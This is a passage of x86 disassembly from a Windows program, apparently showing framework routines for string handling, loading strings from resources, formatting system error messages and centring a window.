  404c33:	mov    eax,DWORD PTR [ebp-0x4]
  404c36:	sub    esi,eax
  404c38:	lea    eax,[edx+eax*2]
  404c3b:	lea    ecx,[esi+esi*1]
  404c3e:	push   ecx
  404c3f:	push   eax
  404c40:	push   ecx
  404c41:	push   ebx
  404c42:	call   DWORD PTR ds:0x40922c
  404c48:	add    esp,0x10
  404c4b:	mov    ecx,eax
  404c4d:	call   0x40467c
  404c52:	mov    eax,DWORD PTR [ebp-0x14]
  404c55:	push   eax
  404c56:	push   0x401748
  404c5b:	push   eax
  404c5c:	push   DWORD PTR [ebp-0xc]
  404c5f:	call   DWORD PTR ds:0x409230
  404c65:	add    esp,0x10
  404c68:	mov    ecx,eax
  404c6a:	call   0x40467c
  404c6f:	mov    edx,DWORD PTR [ebp-0x8]
  404c72:	mov    ecx,DWORD PTR [ebp-0xc]
  404c75:	push   DWORD PTR [ebp+0x8]
  404c78:	lea    eax,[esi+edx*1]
  404c7b:	xor    esi,esi
  404c7d:	sub    edx,DWORD PTR [ebp-0x4]
  404c80:	push   ebx
  404c81:	mov    WORD PTR [ecx+eax*2],si
  404c85:	add    edi,edx
  404c87:	call   DWORD PTR ds:0x409220
  404c8d:	mov    edx,eax
  404c8f:	mov    DWORD PTR [ebp-0xc],eax
  404c92:	pop    ecx
  404c93:	pop    ecx
  404c94:	test   edx,edx
  404c96:	jne    0x404c23
  404c98:	mov    ecx,ebx
  404c9a:	call   0x404d5f
  404c9f:	lea    ebx,[ebx+eax*2]
  404ca2:	add    ebx,0x2
  404ca5:	cmp    ebx,DWORD PTR [ebp-0x20]
  404ca8:	jb     0x404bff
  404cae:	mov    edi,DWORD PTR [ebp-0x24]
  404cb1:	mov    ecx,DWORD PTR [ebp-0x10]
  404cb4:	push   edi
  404cb5:	call   0x4053d4
  404cba:	mov    ebx,DWORD PTR [ebp-0x18]
  404cbd:	pop    esi
  404cbe:	mov    eax,ebx
  404cc0:	pop    ebx
  404cc1:	pop    edi
  404cc2:	mov    esp,ebp
  404cc4:	pop    ebp
  404cc5:	ret    0x8
  404cc8:	int3   
  404cc9:	int3   
  404cca:	int3   
  404ccb:	int3   
  404ccc:	int3   
  404ccd:	int3   
  404cce:	int3   
  404ccf:	int3   
  404cd0:	sub    DWORD PTR [esp+0x4],0x8
  404cd5:	jmp    0x405fd0
  404cda:	int3   
  404cdb:	int3   
  404cdc:	int3   
  404cdd:	int3   
  404cde:	int3   
  404cdf:	int3   
  404ce0:	sub    DWORD PTR [esp+0x4],0xc
  404ce5:	jmp    0x405fd0
  404cea:	int3   
  404ceb:	int3   
  404cec:	int3   
  404ced:	int3   
  404cee:	int3   
  404cef:	int3   
  404cf0:	sub    DWORD PTR [esp+0x4],0x4
  404cf5:	jmp    0x4060c0
  404cfa:	int3   
  404cfb:	int3   
  404cfc:	int3   
  404cfd:	int3   
  404cfe:	int3   
  404cff:	int3   
  404d00:	sub    DWORD PTR [esp+0x4],0x8
  404d05:	jmp    0x4060c0
  404d0a:	int3   
  404d0b:	int3   
  404d0c:	int3   
  404d0d:	int3   
  404d0e:	int3   
  404d0f:	int3   
  404d10:	sub    DWORD PTR [esp+0x4],0xc
  404d15:	jmp    0x4060c0
  404d1a:	int3   
  404d1b:	int3   
  404d1c:	int3   
  404d1d:	int3   
  404d1e:	int3   
  404d1f:	int3   
  404d20:	sub    DWORD PTR [esp+0x4],0x4
  404d25:	jmp    0x4060a0
  404d2a:	int3   
  404d2b:	int3   
  404d2c:	int3   
  404d2d:	int3   
  404d2e:	int3   
  404d2f:	int3   
  404d30:	sub    DWORD PTR [esp+0x4],0x8
  404d35:	jmp    0x4060a0
  404d3a:	int3   
  404d3b:	int3   
  404d3c:	int3   
  404d3d:	int3   
  404d3e:	int3   
  404d3f:	int3   
  404d40:	sub    DWORD PTR [esp+0x4],0x4
  404d45:	jmp    0x405fd0
  404d4a:	int3   
  404d4b:	int3   
  404d4c:	int3   
  404d4d:	int3   
  404d4e:	int3   
  404d4f:	int3   
  404d50:	sub    DWORD PTR [esp+0x4],0xc
  404d55:	jmp    0x4060a0
  404d5a:	int3   
  404d5b:	int3   
  404d5c:	int3   
  404d5d:	int3   
  404d5e:	int3   
  404d5f:	test   ecx,ecx
  404d61:	je     0x404d7b
  404d63:	push   esi
  404d64:	lea    edx,[ecx+0x2]
  404d67:	xor    esi,esi
  404d69:	mov    ax,WORD PTR [ecx]
  404d6c:	add    ecx,0x2
  404d6f:	cmp    ax,si
  404d72:	jne    0x404d69
  404d74:	sub    ecx,edx
  404d76:	sar    ecx,1
  404d78:	pop    esi
  404d79:	jmp    0x404d7d
  404d7b:	xor    ecx,ecx
  404d7d:	mov    eax,ecx
  404d7f:	ret    
  404d80:	int3   
  404d81:	int3   
  404d82:	int3   
  404d83:	int3   
  404d84:	int3   
  404d85:	mov    edi,edi
  404d87:	push   ebx
  404d88:	push   edi
  404d89:	mov    edi,edx
  404d8b:	mov    ebx,ecx
  404d8d:	push   edi
  404d8e:	push   ebx
  404d8f:	call   DWORD PTR ds:0x409058
  404d95:	test   eax,eax
  404d97:	je     0x404dd9
  404d99:	push   esi
  404d9a:	push   eax
  404d9b:	call   DWORD PTR ds:0x409074
  404da1:	mov    esi,eax
  404da3:	test   esi,esi
  404da5:	je     0x404dd6
  404da7:	push   edi
  404da8:	push   ebx
  404da9:	call   DWORD PTR ds:0x409054
  404daf:	push   0xe
  404db1:	pop    edx
  404db2:	lea    ecx,[esi+eax*1]
  404db5:	cmp    esi,ecx
  404db7:	jae    0x404dd6
  404db9:	movzx  eax,WORD PTR [esi]
  404dbc:	lea    esi,[esi+eax*2]
  404dbf:	add    esi,0x2
  404dc2:	sub    edx,0x1
  404dc5:	jne    0x404db5
  404dc7:	cmp    esi,ecx
  404dc9:	jae    0x404dd6
  404dcb:	movzx  eax,WORD PTR [esi]
  404dce:	neg    eax
  404dd0:	sbb    eax,eax
  404dd2:	and    eax,esi
  404dd4:	jmp    0x404dd8
  404dd6:	xor    eax,eax
  404dd8:	pop    esi
  404dd9:	pop    edi
  404dda:	pop    ebx
  404ddb:	ret    0x4
  404dde:	int3   
  404ddf:	int3   
  404de0:	int3   
  404de1:	int3   
  404de2:	int3   
  404de3:	mov    edi,edi
  404de5:	push   ebp
  404de6:	mov    ebp,esp
  404de8:	push   ecx
  404de9:	push   ecx
  404dea:	push   esi
  404deb:	push   edi
  404dec:	xor    eax,eax
  404dee:	mov    edi,ecx
  404df0:	push   eax
  404df1:	push   0x7
  404df3:	push   0x6
  404df5:	push   DWORD PTR [ebp+0x8]
  404df8:	mov    DWORD PTR [ebp-0x4],eax
  404dfb:	call   DWORD PTR ds:0x40905c
  404e01:	test   eax,eax
  404e03:	je     0x404e71
  404e05:	push   ecx
  404e06:	mov    ecx,DWORD PTR [ebp+0x8]
  404e09:	mov    edx,eax
  404e0b:	call   0x404d85
  404e10:	mov    esi,eax
  404e12:	test   esi,esi
  404e14:	je     0x404e71
  404e16:	push   ebx
  404e17:	movzx  ebx,WORD PTR [esi]
  404e1a:	mov    ecx,edi
  404e1c:	push   ebx
  404e1d:	call   0x4053a6
  404e22:	mov    DWORD PTR [ebp-0x8],eax
  404e25:	movzx  eax,WORD PTR [esi]
  404e28:	add    esi,0x2
  404e2b:	cmp    eax,0xffffffff
  404e2e:	jne    0x404e48
  404e30:	mov    ecx,esi
  404e32:	lea    edx,[ecx+0x2]
  404e35:	mov    ax,WORD PTR [ecx]
  404e38:	add    ecx,0x2
  404e3b:	cmp    ax,WORD PTR [ebp-0x4]
  404e3f:	jne    0x404e35
  404e41:	sub    ecx,edx
  404e43:	sar    ecx,1
  404e45:	lea    eax,[ecx+0x1]
  404e48:	add    eax,eax
  404e4a:	push   eax
  404e4b:	push   esi
  404e4c:	lea    eax,[ebx+ebx*1]
  404e4f:	push   eax
  404e50:	push   DWORD PTR [ebp-0x8]
  404e53:	call   DWORD PTR ds:0x409230
  404e59:	add    esp,0x10
  404e5c:	mov    ecx,eax
  404e5e:	call   0x40467c
  404e63:	push   ebx
  404e64:	mov    ecx,edi
  404e66:	call   0x4053d4
  404e6b:	xor    eax,eax
  404e6d:	inc    eax
  404e6e:	pop    ebx
  404e6f:	jmp    0x404e73
  404e71:	xor    eax,eax
  404e73:	pop    edi
  404e74:	pop    esi
  404e75:	mov    esp,ebp
  404e77:	pop    ebp
  404e78:	ret    0x8
  404e7b:	int3   
  404e7c:	int3   
  404e7d:	int3   
  404e7e:	int3   
  404e7f:	int3   
  404e80:	mov    edi,edi
  404e82:	push   ebx
  404e83:	push   esi
  404e84:	push   edi
  404e85:	push   0x0
  404e87:	mov    ebx,ecx
  404e89:	call   0x40561c
  404e8e:	xor    edi,edi
  404e90:	inc    edi
  404e91:	jmp    0x404eb9
  404e93:	push   0x0
  404e95:	push   0x7
  404e97:	push   0x6
  404e99:	push   esi
  404e9a:	call   DWORD PTR ds:0x40905c
  404ea0:	test   eax,eax
  404ea2:	je     0x404eb2
  404ea4:	push   ecx
  404ea5:	mov    edx,eax
  404ea7:	mov    ecx,esi
  404ea9:	call   0x404d85
  404eae:	test   eax,eax
  404eb0:	jne    0x404ebf
  404eb2:	push   edi
  404eb3:	call   0x40561c
  404eb8:	inc    edi
  404eb9:	mov    esi,eax
  404ebb:	test   esi,esi
  404ebd:	jne    0x404e93
  404ebf:	test   esi,esi
  404ec1:	jne    0x404ec7
  404ec3:	xor    eax,eax
  404ec5:	jmp    0x404ed0
  404ec7:	push   ecx
  404ec8:	push   esi
  404ec9:	mov    ecx,ebx
  404ecb:	call   0x404de3
  404ed0:	pop    edi
  404ed1:	pop    esi
  404ed2:	pop    ebx
  404ed3:	ret    0x4
  404ed6:	int3   
  404ed7:	int3   
  404ed8:	int3   
  404ed9:	int3   
  404eda:	int3   
  404edb:	mov    edi,edi
  404edd:	push   ebp
  404ede:	mov    ebp,esp
  404ee0:	sub    esp,0x38
  404ee3:	mov    eax,ds:0x408008
  404ee8:	xor    eax,ebp
  404eea:	mov    DWORD PTR [ebp-0x4],eax
  404eed:	push   ebx
  404eee:	push   esi
  404eef:	push   edi
  404ef0:	mov    ebx,ecx
  404ef2:	push   0xfffffff0
  404ef4:	push   DWORD PTR [ebx]
  404ef6:	call   DWORD PTR ds:0x4090a4
  404efc:	mov    esi,eax
  404efe:	and    esi,0x40000000
  404f04:	je     0x404f10
  404f06:	push   DWORD PTR [ebx]
  404f08:	call   DWORD PTR ds:0x4090c0
  404f0e:	jmp    0x404f1a
  404f10:	push   0x4
  404f12:	push   DWORD PTR [ebx]
  404f14:	call   DWORD PTR ds:0x4090a8
  404f1a:	mov    edi,eax
  404f1c:	lea    eax,[ebp-0x34]
  404f1f:	push   eax
  404f20:	push   DWORD PTR [ebx]
  404f22:	call   DWORD PTR ds:0x4090d0
  404f28:	test   esi,esi
  404f2a:	jne    0x404f78
  404f2c:	test   edi,edi
  404f2e:	je     0x404f4b
  404f30:	push   0xfffffff0
  404f32:	push   edi
  404f33:	call   DWORD PTR ds:0x4090a4
  404f39:	and    eax,0x30000000
  404f3e:	sub    eax,0x10000000
  404f43:	neg    eax
  404f45:	sbb    eax,eax
  404f47:	not    eax
  404f49:	and    edi,eax
  404f4b:	push   0x0
  404f4d:	lea    eax,[ebp-0x14]
  404f50:	push   eax
  404f51:	push   0x0
  404f53:	push   0x30
  404f55:	call   DWORD PTR ds:0x4090b8
  404f5b:	test   edi,edi
  404f5d:	jne    0x404f6b
  404f5f:	lea    esi,[ebp-0x14]
  404f62:	lea    edi,[ebp-0x24]
  404f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f69:	jmp    0x404fa6
  404f6b:	lea    eax,[ebp-0x24]
  404f6e:	push   eax
  404f6f:	push   edi
  404f70:	call   DWORD PTR ds:0x4090d0
  404f76:	jmp    0x404fa6
  404f78:	push   DWORD PTR [ebx]
  404f7a:	call   DWORD PTR ds:0x4090c0
  404f80:	mov    esi,eax
  404f82:	lea    eax,[ebp-0x14]
  404f85:	push   eax
  404f86:	push   esi
  404f87:	call   DWORD PTR ds:0x4090c4
  404f8d:	lea    eax,[ebp-0x24]
  404f90:	push   eax
  404f91:	push   edi
  404f92:	call   DWORD PTR ds:0x4090c4
  404f98:	push   0x2
  404f9a:	lea    eax,[ebp-0x24]
  404f9d:	push   eax
  404f9e:	push   esi
  404f9f:	push   edi
  404fa0:	call   DWORD PTR ds:0x4090c8
  404fa6:	mov    eax,DWORD PTR [ebp-0x28]
  404fa9:	sub    eax,DWORD PTR [ebp-0x30]
  404fac:	mov    edi,DWORD PTR [ebp-0x2c]
  404faf:	sub    edi,DWORD PTR [ebp-0x34]
  404fb2:	mov    DWORD PTR [ebp-0x38],eax
  404fb5:	mov    eax,DWORD PTR [ebp-0x1c]
  404fb8:	add    eax,DWORD PTR [ebp-0x24]
  404fbb:	cdq    
  404fbc:	sub    eax,edx
  404fbe:	mov    esi,eax
  404fc0:	mov    eax,edi
  404fc2:	cdq    
  404fc3:	sub    eax,edx
  404fc5:	sar    esi,1
  404fc7:	sar    eax,1
  404fc9:	sub    esi,eax
  404fcb:	mov    eax,DWORD PTR [ebp-0x18]
  404fce:	add    eax,DWORD PTR [ebp-0x20]
  404fd1:	cdq    
  404fd2:	sub    eax,edx
  404fd4:	mov    ecx,eax
  404fd6:	mov    eax,DWORD PTR [ebp-0x38]
  404fd9:	cdq    
  404fda:	sub    eax,edx
  404fdc:	sar    ecx,1
  404fde:	sar    eax,1
  404fe0:	sub    ecx,eax
  404fe2:	cmp    esi,DWORD PTR [ebp-0x14]
  404fe5:	jge    0x404fec
  404fe7:	mov    esi,DWORD PTR [ebp-0x14]
  404fea:	jmp    0x404ff9
  404fec:	lea    eax,[esi+edi*1]
  404fef:	cmp    eax,DWORD PTR [ebp-0xc]
  404ff2:	jle    0x404ff9
  404ff4:	mov    esi,DWORD PTR [ebp-0xc]
  404ff7:	sub    esi,edi
  404ff9:	cmp    ecx,DWORD PTR [ebp-0x10]
  404ffc:	jge    0x405003
  404ffe:	mov    ecx,DWORD PTR [ebp-0x10]
  405001:	jmp    0x405013
  405003:	mov    edx,DWORD PTR [ebp-0x38]
  405006:	lea    eax,[ecx+edx*1]
  405009:	cmp    eax,DWORD PTR [ebp-0x8]
  40500c:	jle    0x405013
  40500e:	mov    ecx,DWORD PTR [ebp-0x8]
  405011:	sub    ecx,edx
  405013:	push   0x15
  405015:	push   0xffffffff
  405017:	push   0xffffffff
  405019:	push   ecx
  40501a:	push   esi
  40501b:	push   0x0
  40501d:	push   DWORD PTR [ebx]
  40501f:	call   DWORD PTR ds:0x4090d4
  405025:	mov    ecx,DWORD PTR [ebp-0x4]
  405028:	pop    edi
  405029:	pop    esi
  40502a:	xor    ecx,ebp
  40502c:	pop    ebx
  40502d:	call   0x4071f0
  405032:	mov    esp,ebp
  405034:	pop    ebp
  405035:	ret    0x4
  405038:	int3   
  405039:	int3   
  40503a:	int3   
  40503b:	int3   
  40503c:	int3   
  40503d:	mov    edi,edi
  40503f:	push   ebp
  405040:	mov    ebp,esp
  405042:	push   esi
  405043:	mov    esi,DWORD PTR [ebp+0xc]
  405046:	push   edi
  405047:	test   esi,esi
  405049:	je     0x40508f
  40504b:	lea    eax,[ebp+0x10]
  40504e:	push   eax
  40504f:	push   esi
  405050:	call   DWORD PTR ds:0x409224
  405056:	mov    edi,eax
  405058:	pop    ecx
  405059:	pop    ecx
  40505a:	cmp    edi,0xffffffff
  40505d:	jne    0x405066
  40505f:	mov    ecx,0x8007000e
  405064:	jmp    0x405094
  405066:	mov    ecx,DWORD PTR [ebp+0x8]
  405069:	push   edi
  40506a:	call   0x4053a6
  40506f:	lea    ecx,[ebp+0x10]
  405072:	push   ecx
  405073:	push   esi
  405074:	lea    edx,[edi+0x1]
  405077:	push   edx
  405078:	push   eax
  405079:	call   DWORD PTR ds:0x409228
  40507f:	mov    ecx,DWORD PTR [ebp+0x8]
  405082:	add    esp,0x10
  405085:	push   edi
  405086:	call   0x4053d4
  40508b:	pop    edi
  40508c:	pop    esi
  40508d:	pop    ebp
  40508e:	ret    
  40508f:	mov    ecx,0x80070057
  405094:	call   0x4046c7
  405099:	int3   
  40509a:	int3   
  40509b:	int3   
  40509c:	int3   
  40509d:	int3   
  40509e:	int3   
  40509f:	mov    edi,edi
  4050a1:	push   ebp
  4050a2:	mov    ebp,esp
  4050a4:	cmp    DWORD PTR [ebp+0x8],0x0
  4050a8:	push   edi
  4050a9:	mov    edi,ecx
  4050ab:	jne    0x4050b1
  4050ad:	xor    edx,edx
  4050af:	jmp    0x4050ca
  4050b1:	mov    edx,DWORD PTR [ebp+0x8]
  4050b4:	push   ebx
  4050b5:	xor    ebx,ebx
  4050b7:	lea    ecx,[edx+0x2]
  4050ba:	mov    ax,WORD PTR [edx]
  4050bd:	add    edx,0x2
  4050c0:	cmp    ax,bx
  4050c3:	jne    0x4050ba
  4050c5:	sub    edx,ecx
  4050c7:	sar    edx,1
  4050c9:	pop    ebx
  4050ca:	push   edx
  4050cb:	push   DWORD PTR [ebp+0x8]
  4050ce:	mov    ecx,edi
  4050d0:	call   0x405406
  4050d5:	mov    eax,edi
  4050d7:	pop    edi
  4050d8:	pop    ebp
  4050d9:	ret    0x4
  4050dc:	int3   
  4050dd:	int3   
  4050de:	int3   
  4050df:	int3   
  4050e0:	int3   
  4050e1:	mov    edi,edi
  4050e3:	push   ebp
  4050e4:	mov    ebp,esp
  4050e6:	push   ecx
  4050e7:	push   ecx
  4050e8:	mov    eax,ds:0x408008
  4050ed:	xor    eax,ebp
  4050ef:	mov    DWORD PTR [ebp-0x4],eax
  4050f2:	mov    eax,ds:0x40803c
  4050f7:	and    DWORD PTR [ebp-0x8],0x0
  4050fb:	push   ebx
  4050fc:	push   esi
  4050fd:	mov    esi,DWORD PTR [eax+0xc]
  405100:	mov    ebx,edx
  405102:	push   edi
  405103:	mov    edi,ecx
  405105:	mov    ecx,esi
  405107:	call   DWORD PTR ds:0x409254
  40510d:	mov    ecx,0x40803c
  405112:	call   esi
  405114:	xor    ecx,ecx
  405116:	add    eax,0x10
  405119:	push   ecx
  40511a:	push   ecx
  40511b:	mov    DWORD PTR [edi],eax
  40511d:	lea    eax,[ebp-0x8]
  405120:	push   eax
  405121:	push   ecx
  405122:	push   ebx
  405123:	push   ecx
  405124:	push   0x1300
  405129:	call   DWORD PTR ds:0x40906c
  40512f:	test   eax,eax
  405131:	jne    0x405144
  405133:	push   ebx
  405134:	push   0x4017a4
  405139:	push   edi
  40513a:	call   0x40503d
  40513f:	add    esp,0xc
  405142:	jmp    0x405199
  405144:	push   DWORD PTR [ebp-0x8]
  405147:	mov    ecx,edi
  405149:	call   0x40509f
  40514e:	push   DWORD PTR [ebp-0x8]
  405151:	call   DWORD PTR ds:0x409070
  405157:	mov    ecx,DWORD PTR [edi]
  405159:	mov    ebx,DWORD PTR [ecx-0xc]
  40515c:	mov    esi,ebx
  40515e:	test   esi,esi
  405160:	jle    0x405189
  405162:	lea    ecx,[ecx+esi*2]
  405165:	lea    eax,[esi-0x1]
  405168:	add    ecx,0xfffffffe
  40516b:	test   eax,eax
  40516d:	js     0x4051ae
  40516f:	cmp    eax,ebx
  405171:	jg     0x4051ae
  405173:	movzx  edx,WORD PTR [ecx]
  405176:	cmp    edx,0xd
  405179:	je     0x405180
  40517b:	cmp    edx,0xa
  40517e:	jne    0x405189
  405180:	dec    esi
  405181:	sub    ecx,0x2
  405184:	dec    eax
  405185:	test   esi,esi
  405187:	jg     0x40516b
  405189:	push   esi
  40518a:	mov    ecx,edi
  40518c:	call   0x4053a6
  405191:	push   esi
  405192:	mov    ecx,edi
  405194:	call   0x4053d4
  405199:	mov    ecx,DWORD PTR [ebp-0x4]
  40519c:	mov    eax,edi
  40519e:	pop    edi
  40519f:	pop    esi
  4051a0:	xor    ecx,ebp
  4051a2:	pop    ebx
  4051a3:	call   0x4071f0
  4051a8:	mov    esp,ebp
  4051aa:	pop    ebp
  4051ab:	ret    0x4
  4051ae:	mov    ecx,0x80070057
  4051b3:	call   0x4046c7
  4051b8:	int3   
  4051b9:	int3   
  4051ba:	int3   
  4051bb:	int3   
  4051bc:	int3   
  4051bd:	int3   
  4051be:	mov    edi,edi
  4051c0:	push   ebp
  4051c1:	mov    ebp,esp
  4051c3:	push   ecx
  4051c4:	mov    eax,ds:0x408008
  4051c9:	xor    eax,ebp
  4051cb:	mov    DWORD PTR [ebp-0x4],eax
  4051ce:	push   ebx
  4051cf:	push   edi
  4051d0:	mov    edi,ecx
  4051d2:	xor    edx,edx
  4051d4:	mov    eax,DWORD PTR [edi]
  4051d6:	lea    ecx,[eax-0x10]
  4051d9:	mov    ebx,DWORD PTR [ecx]
  4051db:	cmp    DWORD PTR [ecx+0x4],edx
  4051de:	je     0x405213
  4051e0:	cmp    DWORD PTR [ecx+0xc],edx
  4051e3:	jge    0x4051f6
  4051e5:	cmp    DWORD PTR [eax-0x8],edx
  4051e8:	jl     0x405223
  4051ea:	mov    DWORD PTR [eax-0xc],edx
  4051ed:	xor    ecx,ecx
  4051ef:	mov    eax,DWORD PTR [edi]
  4051f1:	mov    WORD PTR [eax],cx
  4051f4:	jmp    0x405213
  4051f6:	push   esi
  4051f7:	call   0x405536
  4051fc:	mov    eax,DWORD PTR [ebx]
  4051fe:	mov    esi,DWORD PTR [eax+0xc]
  405201:	mov    ecx,esi
  405203:	call   DWORD PTR ds:0x409254
  405209:	mov    ecx,ebx
  40520b:	call   esi
  40520d:	add    eax,0x10
  405210:	mov    DWORD PTR [edi],eax
  405212:	pop    esi
  405213:	mov    ecx,DWORD PTR [ebp-0x4]
  405216:	pop    edi
  405217:	xor    ecx,ebp
  405219:	pop    ebx
  40521a:	call   0x4071f0
  40521f:	mov    esp,ebp
  405221:	pop    ebp
  405222:	ret    
  405223:	mov    ecx,0x80070057
  405228:	call   0x4046c7
  40522d:	int3   
  40522e:	int3   
  40522f:	int3   
  405230:	int3   
  405231:	int3   
  405232:	int3   
  405233:	mov    edi,edi
  405235:	push   ebp
  405236:	mov    ebp,esp
  405238:	sub    esp,0x14
  40523b:	mov    eax,ds:0x408008
  405240:	xor    eax,ebp
  405242:	mov    DWORD PTR [ebp-0x4],eax
  405245:	mov    eax,ecx
  405247:	push   ebx
  405248:	push   esi
  405249:	push   edi
  40524a:	mov    ecx,DWORD PTR [eax]
  40524c:	sub    ecx,0x10
  40524f:	mov    DWORD PTR [ebp-0x14],eax
  405252:	mov    DWORD PTR [ebp-0x8],ecx
  405255:	mov    edi,DWORD PTR [ecx]
  405257:	mov    eax,DWORD PTR [ecx+0x4]
  40525a:	mov    DWORD PTR [ebp-0x10],eax
  40525d:	mov    eax,DWORD PTR [edi]
  40525f:	mov    esi,DWORD PTR [eax+0x10]
  405262:	mov    ecx,esi
  405264:	call   DWORD PTR ds:0x409254
  40526a:	mov    ecx,edi
  40526c:	call   esi
  40526e:	mov    ebx,DWORD PTR [ebp+0x8]
  405271:	mov    edi,eax
  405273:	push   0x2
  405275:	push   ebx
  405276:	mov    ecx,DWORD PTR [edi]
  405278:	mov    esi,DWORD PTR [ecx]
  40527a:	mov    ecx,esi
  40527c:	call   DWORD PTR ds:0x409254
  405282:	mov    ecx,edi
  405284:	call   esi
  405286:	mov    DWORD PTR [ebp-0xc],eax
  405289:	test   eax,eax
  40528b:	je     0x4052d8
  40528d:	mov    edi,DWORD PTR [ebp-0x10]
  405290:	cmp    edi,ebx
  405292:	jge    0x405296
  405294:	mov    ebx,edi
  405296:	lea    edx,[ebx*2+0x2]
  40529d:	mov    ebx,DWORD PTR [ebp-0x8]
  4052a0:	lea    esi,[eax+0x10]
  4052a3:	push   edx
  4052a4:	lea    eax,[ebx+0x10]
  4052a7:	push   eax
  4052a8:	push   edx
  4052a9:	push   esi
  4052aa:	call   DWORD PTR ds:0x409230
  4052b0:	mov    eax,DWORD PTR [ebp-0xc]
  4052b3:	add    esp,0x10
  4052b6:	mov    ecx,ebx
  4052b8:	mov    DWORD PTR [eax+0x4],edi
  4052bb:	call   0x405536
  4052c0:	mov    eax,DWORD PTR [ebp-0x14]
  4052c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4052c6:	pop    edi
  4052c7:	xor    ecx,ebp
  4052c9:	mov    DWORD PTR [eax],esi
  4052cb:	pop    esi
  4052cc:	pop    ebx
  4052cd:	call   0x4071f0
  4052d2:	mov    esp,ebp
  4052d4:	pop    ebp
  4052d5:	ret    0x4
  4052d8:	call   0x40548e
  4052dd:	int3   
  4052de:	int3   
  4052df:	int3   
  4052e0:	int3   
  4052e1:	int3   
  4052e2:	int3   
  4052e3:	mov    edi,edi
  4052e5:	push   ebp
  4052e6:	mov    ebp,esp
  4052e8:	push   ecx
  4052e9:	mov    eax,ds:0x408008
  4052ee:	xor    eax,ebp
  4052f0:	mov    DWORD PTR [ebp-0x4],eax
  4052f3:	push   ebx
  4052f4:	push   esi
  4052f5:	mov    esi,DWORD PTR [ebp+0x8]
  4052f8:	push   edi
  4052f9:	mov    edi,ecx
  4052fb:	mov    edx,DWORD PTR [edi]
  4052fd:	sub    edx,0x10
  405300:	mov    ebx,DWORD PTR [edx]
  405302:	cmp    DWORD PTR [edx+0x8],esi
  405305:	jge    0x40533c
  405307:	test   esi,esi
  405309:	jle    0x40533c
  40530b:	mov    eax,DWORD PTR [ebx]
  40530d:	push   0x2
  40530f:	push   esi
  405310:	push   edx
  405311:	mov    esi,DWORD PTR [eax+0x8]
  405314:	mov    ecx,esi
  405316:	call   DWORD PTR ds:0x409254
  40531c:	mov    ecx,ebx
  40531e:	call   esi
  405320:	test   eax,eax
  405322:	je     0x40533c
  405324:	mov    ecx,DWORD PTR [ebp-0x4]
  405327:	add    eax,0x10
  40532a:	mov    DWORD PTR [edi],eax
  40532c:	xor    ecx,ebp
  40532e:	pop    edi
  40532f:	pop    esi
  405330:	pop    ebx
  405331:	call   0x4071f0
  405336:	mov    esp,ebp
  405338:	pop    ebp
  405339:	ret    0x4
  40533c:	call   0x40548e
  405341:	int3   
  405342:	int3   
  405343:	int3   
  405344:	int3   
  405345:	int3   
  405346:	int3   
  405347:	mov    edi,edi
  405349:	push   ebp
  40534a:	mov    ebp,esp
  40534c:	push   esi
  40534d:	mov    esi,DWORD PTR [ebp+0x8]
  405350:	push   edi
  405351:	mov    edi,ecx
  405353:	mov    ecx,DWORD PTR [edi]
  405355:	cmp    DWORD PTR [ecx-0xc],esi
  405358:	jle    0x40535d
  40535a:	mov    esi,DWORD PTR [ecx-0xc]
  40535d:	cmp    DWORD PTR [ecx-0x4],0x1
  405361:	jle    0x40536d
  405363:	push   esi
  405364:	mov    ecx,edi
  405366:	call   0x405233
  40536b:	jmp    0x40539b
  40536d:	mov    ecx,DWORD PTR [ecx-0x8]
  405370:	cmp    ecx,esi
  405372:	jge    0x40539b
  405374:	cmp    ecx,0x40000000
  40537a:	jle    0x405384
  40537c:	add    ecx,0x100000
  405382:	jmp    0x40538d
  405384:	mov    eax,ecx
  405386:	cdq    
  405387:	sub    eax,edx
  405389:	sar    eax,1
  40538b:	add    ecx,eax
  40538d:	cmp    ecx,esi
  40538f:	jge    0x405393
  405391:	mov    ecx,esi
  405393:	push   ecx
  405394:	mov    ecx,edi
  405396:	call   0x4052e3
  40539b:	pop    edi
  40539c:	pop    esi
  40539d:	pop    ebp
  40539e:	ret    0x4
  4053a1:	int3   
  4053a2:	int3   
  4053a3:	int3   
  4053a4:	int3   
  4053a5:	int3   
  4053a6:	mov    edi,edi
  4053a8:	push   ebp
  4053a9:	mov    ebp,esp
  4053ab:	push   esi
  4053ac:	mov    esi,ecx
  4053ae:	xor    edx,edx
  4053b0:	inc    edx
  4053b1:	mov    eax,DWORD PTR [esi]
  4053b3:	sub    edx,DWORD PTR [eax-0x4]
  4053b6:	mov    eax,DWORD PTR [eax-0x8]
  4053b9:	sub    eax,DWORD PTR [ebp+0x8]
  4053bc:	or     edx,eax
  4053be:	jge    0x4053c8
  4053c0:	push   DWORD PTR [ebp+0x8]
  4053c3:	call   0x405347
  4053c8:	mov    eax,DWORD PTR [esi]
  4053ca:	pop    esi
  4053cb:	pop    ebp
  4053cc:	ret    0x4
  4053cf:	int3   
  4053d0:	int3   
  4053d1:	int3   
  4053d2:	int3   
  4053d3:	int3   
  4053d4:	mov    edi,edi
  4053d6:	push   ebp
  4053d7:	mov    ebp,esp
  4053d9:	mov    edx,DWORD PTR [ebp+0x8]
  4053dc:	test   edx,edx
  4053de:	js     0x4053f6
  4053e0:	mov    eax,DWORD PTR [ecx]
  4053e2:	cmp    edx,DWORD PTR [eax-0x8]
  4053e5:	jg     0x4053f6
  4053e7:	mov    DWORD PTR [eax-0xc],edx
  4053ea:	mov    eax,DWORD PTR [ecx]
  4053ec:	xor    ecx,ecx
  4053ee:	mov    WORD PTR [eax+edx*2],cx
  4053f2:	pop    ebp
  4053f3:	ret    0x4
  4053f6:	mov    ecx,0x80070057
  4053fb:	call   0x4046c7
  405400:	int3   
  405401:	int3   
  405402:	int3   
  405403:	int3   
  405404:	int3   
  405405:	int3   
  405406:	mov    edi,edi
  405408:	push   ebp
  405409:	mov    ebp,esp
  40540b:	push   ecx
  40540c:	push   ecx
  40540d:	push   ebx
  40540e:	push   edi
  40540f:	mov    edi,DWORD PTR [ebp+0xc]
  405412:	mov    ebx,ecx
  405414:	test   edi,edi
  405416:	jne    0x40541f
  405418:	call   0x4051be
  40541d:	jmp    0x405476
  40541f:	cmp    DWORD PTR [ebp+0x8],0x0
  405423:	je     0x40547e
